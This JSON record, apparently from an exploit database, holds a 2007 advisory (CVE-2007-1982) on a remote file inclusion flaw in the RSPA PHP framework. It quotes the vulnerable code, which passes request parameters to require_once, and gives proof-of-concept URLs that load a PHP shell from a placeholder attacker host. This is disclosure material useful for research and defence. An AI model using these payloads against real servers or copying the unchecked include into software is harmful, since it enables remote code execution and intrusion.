{
  "id": "3641",
  "title": "Really Simple PHP and Ajax (RSPA) 2007-03-23 - Remote File Inclusion",
  "cve": "CVE-2007-1982",
  "vuln_type": "rce",
  "code": "RSPA Remote File Inclusion\r\n\r\nReally Simple PHP and Ajax (RSPA)\r\nRSPA is a component based event driven ajax enabled framework for PHP4 and PHP 5. It is a combination of plane PHP class and HTML/Javascript.RSPA allows calling server side PHP functions from client javascript events. Visit http://rspa.sourceforge.net\r\n\r\nCredit:\r\nThe information has been provided by Hamid Ebadi\r\nThe original article can be found at : http://www.bugtraq.ir\r\n\r\nhttp://www.bugtraq.ir/articles/advisory/RSPA_File_Inclusion/6\r\n\r\nVulnerable Systems:\r\nVersion: rspa-2007-03-23\r\n\r\nDescription:\r\nInput passed to the\" __IncludeFilePHPClass \", \" __ClassPath\" and \" __class\" parameters in \"rspa/framework/Controller_v5.php\" and \" rspa/framework/Controller_v4.php \" is not properly verified before being used to include files. This can be exploited to execute arbitrary PHP code by including files from local or external resources.\r\n\r\n\r\nread more about file inclusion in http://www.bugtraq.ir/articles\r\n\r\nVulnerable Code :\r\nrequire_once(\"rspaconf.inc.php\");\r\n\r\n\t$className = $_REQUEST['__class'];\r\n\t$methordName =  $_REQUEST['__methord'];\r\n\r\n\t// IncludeFile for PHP Class\r\n\t\tif ($_REQUEST['__IncludeFilePHPClass']){\r\n\t\t\t$filename = $_REQUEST['__IncludeFilePHPClass'];\r\n\t\t\trequire_once ($filename);\r\n\t\t}\r\n\r\n\t// Parms\r\n\t\tif (isset($_REQUEST['__parameters'])){$parameter = getParms($_REQUEST['__parameters']);}else{$parameter=\"\";}\r\n\r\n\t// ClassFile + ClassPath\r\n\t\tinclude (\"../components/Form.class.php\");\r\n\t \tif ($_REQUEST[\"__ClassPath\"]==\"null\" || empty($_REQUEST[\"__ClassPath\"])){\r\n\t \t\t$filename = $RSPA['class_folder'].$className.$RSPA['class_extension'];\r\n\t \t}else{\r\n\t \t\t$filename = $_REQUEST[\"__ClassPath\"].$className.$RSPA['class_extension'];\r\n\t \t}\r\n\t \trequire_once($filename);\r\n\r\n\r\n\r\nPOC exploit :\r\nThe following URL will cause remote file inclusion\r\n\r\nhttp://[HOST]/rspa/framework/Controller_v5.php?__IncludeFilePHPClass=http://attacker/phpshell.txt/?\r\nhttp://[HOST]/rspa/framework/Controller_v4.php?__ClassPath=http://attacker/phpshell.txt/?\r\n\r\n[ http://www.bugtraq.ir/articles/advisory/RSPA_File_Inclusion/6 ]\r\n\r\n# copyright : http://www.bugtraq.ir\r\n\r\n# milw0rm.com [2007-04-02]",
  "url": "https://www.exploit-db.com/exploits/3641"
}